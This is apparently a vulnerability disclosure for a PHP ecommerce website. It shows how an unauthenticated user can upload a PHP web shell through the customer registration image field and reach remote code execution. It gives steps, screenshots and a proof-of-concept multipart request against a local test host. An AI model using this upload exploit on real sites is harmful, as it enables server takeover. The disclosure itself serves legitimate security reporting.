# Ecommerce Website Unrestricted File Upload + RCE
* `Note` => Create account, don't need login client or admin
* `Description` => Create account upload web shell at `Customer Image`
# Step to Reproduct
* `Register` -> upload web shell at `Customer Image` -> clicked `Register` button
# Exploit 
* Upload web shell at `Customer Image`
![image](https://user-images.githubusercontent.com/79050415/158986253-46273b43-2514-4c69-98c3-e551709b6b03.png)
* When upload success access `/customer/customer_images/lmao.php`
![image](https://user-images.githubusercontent.com/79050415/158987185-c09b133f-0e7b-4b81-abaf-c65c2a457815.png)
* Web shell actived
![image](https://user-images.githubusercontent.com/79050415/158987403-152d7beb-9667-495f-8608-961c314406de.png)
# Vulnerable Code
![image](https://user-images.githubusercontent.com/79050415/158987476-c7155c26-5762-4825-8be4-33f2b7af2dac.png)
* No file checking before uploading
# POC
* `Injection Point` 
```c
------WebKitFormBoundaryKb0szREcd2Bt8BmF
Content-Disposition: form-data; name="c_image"; filename="lmao.php"
Content-Type: application/octet-stream
```
* `Request`
```c
POST /ecommerce-website-php/customer_register.php HTTP/1.1
Host: localhost:8080
Content-Length: 179489
...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKb0szREcd2Bt8BmF
...
Referer: http://localhost:8080/ecommerce-website-php/customer_register.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=i1e5h9ubpsidb6rdnq372gttoq
Connection: close
...
1
------WebKitFormBoundaryKb0szREcd2Bt8BmF
Content-Disposition: form-data; name="c_country"
...
```
* `POC VIDEO` https://drive.google.com/file/d/1m6rovKb3ZWJ-vbsVlfaZDGmyZ_F13nCf/view?usp=sharing
